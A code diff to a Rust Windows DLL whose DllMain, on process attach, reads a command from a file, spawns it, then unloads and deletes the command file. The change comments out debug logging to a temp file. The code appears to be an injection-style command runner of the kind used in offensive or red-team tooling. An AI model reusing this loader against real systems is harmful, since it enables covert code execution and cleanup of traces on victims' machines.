@@ -1,5 +1,4 @@
-use std::fs::{self, File};
-use std::io::Write;
+use std::fs::{self};
 use std::path::PathBuf;
 use std::process::Command;
 
@@ -8,7 +7,7 @@ use windows::Win32::System::SystemServices::{
     DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
 };
 
-use crate::utils::{get_module_name, get_temp_path};
+use crate::utils::get_module_name;
 mod utils;
 
 #[no_mangle]
@@ -35,9 +34,9 @@ extern "C" fn DllMain(hinstDll: HINSTANCE, fwdReason: u32, _lpvReserved: *const 
 
     match fwdReason {
         DLL_PROCESS_ATTACH => {
-            let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
-            let mut fd = File::create(&temp_file).unwrap();
-            writeln!(fd, "[PROC_ATTACH] Runner gets loaded...").ok();
+            // let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
+            // let mut fd = File::create(&temp_file).unwrap();
+            // writeln!(fd, "[PROC_ATTACH] Runner gets loaded...").ok();
 
             let cmd_path = cmd_path.unwrap();
             if let Ok(payload) = fs::read_to_string(&cmd_path) {
@@ -46,7 +45,7 @@ extern "C" fn DllMain(hinstDll: HINSTANCE, fwdReason: u32, _lpvReserved: *const 
                     .arg(&payload)
                     .spawn()
                 {
-                    writeln!(fd, "[PROC_ATTACH] Spawned cmd: {:?}", payload).ok();
+                    // writeln!(fd, "[PROC_ATTACH] Spawned cmd: {:?}", payload).ok();
                     child.wait().ok();
                 }
 
@@ -55,9 +54,9 @@ extern "C" fn DllMain(hinstDll: HINSTANCE, fwdReason: u32, _lpvReserved: *const 
             return false;
         }
         DLL_PROCESS_DETACH => {
-            let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
-            let mut fd = File::create(&temp_file).unwrap();
-            writeln!(fd, "[PROC_DETACH] Runner gets unloaded...").ok();
+            // let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
+            // let mut fd = File::create(&temp_file).unwrap();
+            // writeln!(fd, "[PROC_DETACH] Runner gets unloaded...").ok();
 
             if let Some(p) = cmd_path {
                 fs::remove_file(p).ok();
